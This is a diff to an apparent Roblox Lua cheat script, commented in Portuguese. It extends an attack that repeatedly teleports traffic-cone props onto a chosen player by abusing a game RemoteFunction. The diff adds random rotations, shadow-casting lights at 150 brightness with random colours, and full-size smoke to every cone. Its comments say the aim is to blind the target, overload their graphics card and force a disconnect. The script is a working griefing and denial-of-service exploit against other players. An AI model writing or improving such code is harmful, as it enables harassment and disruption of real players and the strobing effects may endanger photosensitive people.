@@ -191,25 +191,28 @@ MainTab:Button({
             end
             
             if targetPlayer then
+                -- Busca focado exatamente na pasta 001_TrafficCones que você especificou
                 local trafficCones = WorkspaceCom and WorkspaceCom:FindFirstChild("001_TrafficCones")
                 
                 if trafficCones then
                     if _G.KickAtivo then 
                         _G.KickAtivo = false 
-                        task.wait(0.1) 
+                        task.wait(0.2) 
                     end
                     _G.KickAtivo = true
 
                     WindUI:Notify({
-                        Title = "🛡️ Ataque Iniciado", 
-                        Content = "Teleportando cones continuamente para " .. targetPlayer.Name, 
+                        Title = "🪩 Ataque de Luz Iniciado", 
+                        Content = "Teleportando todos os objetos da pasta de cones com sobrecarga visual em " .. targetPlayer.Name, 
                         Duration = 3
                     })
 
                     task.spawn(function()
                         while _G.KickAtivo and targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
                             local targetHRP = targetPlayer.Character.HumanoidRootPart
-                            local spawnCFrame = targetHRP.CFrame 
+                            
+                            -- CFrame rotativo tridimensional para sobrecarregar a câmera e a placa de vídeo do alvo
+                            local spawnCFrame = targetHRP.CFrame * CFrame.Angles(math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)), math.rad(math.random(-180, 180)))
                             local props = trafficCones:GetChildren()
                             
                             if #props > 0 then
@@ -217,21 +220,57 @@ MainTab:Button({
                                     if not _G.KickAtivo then break end
                                     if not (targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")) then break end
                                     
+                                    if prop:IsA("BasePart") then
+                                        -- Aplica os efeitos destrutivos de iluminação RGB e partículas em cada objeto dentro da pasta
+                                        task.defer(function()
+                                            if not prop:FindFirstChild("SuperNovaDisco") then
+                                                local luzCega = Instance.new("PointLight")
+                                                luzCega.Name = "SuperNovaDisco"
+                                                luzCega.Brightness = 150 -- Brilho estourado para cega-lo
+                                                luzCega.Range = 100
+                                                luzCega.Shadows = true -- Força o Roblox dele a calcular sombras complexas em tempo real (Gera Lag Crítico)
+                                                luzCega.Color = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) -- Efeito estroboscópico de cores piscantes
+                                                luzCega.Parent = prop
+                                            end
+
+                                            if not prop:FindFirstChild("CrashSmoke") then
+                                                local fumaçaPesa = Instance.new("Smoke")
+                                                fumaçaPesa.Name = "CrashSmoke"
+                                                fumaçaPesa.Size = 150 -- Expande a fumaça ao máximo para cobrir o campo de visão
+                                                fumaçaPesa.Opacity = 1
+                                                fumaçaPesa.Parent = prop
+                                            end
+                                        end)
+                                    end
+
                                     local setCFrameRemote = prop:FindFirstChild("SetCurrentCFrame")
                                     if setCFrameRemote and setCFrameRemote:IsA("RemoteFunction") then
-                                        pcall(function()
-                                            setCFrameRemote:InvokeServer(spawnCFrame)
+                                        -- Mantido task.defer para que a requisição ocorra em segundo plano sem congelar o seu FPS
+                                        task.defer(function()
+                                            pcall(function()
+                                                setCFrameRemote:InvokeServer(spawnCFrame)
+                                            end)
                                         end)
                                     end
                                 end
                             end
-                            task.wait(0.1) 
+                            task.wait(0.05) 
+                        end
+                        
+                        -- Limpa as luzes e fumaças pesadas dos objetos da pasta ao encerrar o script
+                        if trafficCones then
+                            for _, prop in pairs(trafficCones:GetChildren()) do
+                                local l = prop:FindFirstChild("SuperNovaDisco")
+                                local s = prop:FindFirstChild("CrashSmoke")
+                                if l then l:Destroy() end
+                                if s then s:Destroy() end
+                            end
                         end
                         
                         if _G.KickAtivo then
                             WindUI:Notify({
                                 Title = "✅ Alvo Eliminado", 
-                                Content = "O jogador saiu ou foi desconectado.", 
+                                Content = "O jogador saiu ou foi desconectado pelo estouro de renderização.", 
                                 Duration = 5
                             })
                             _G.KickAtivo = false
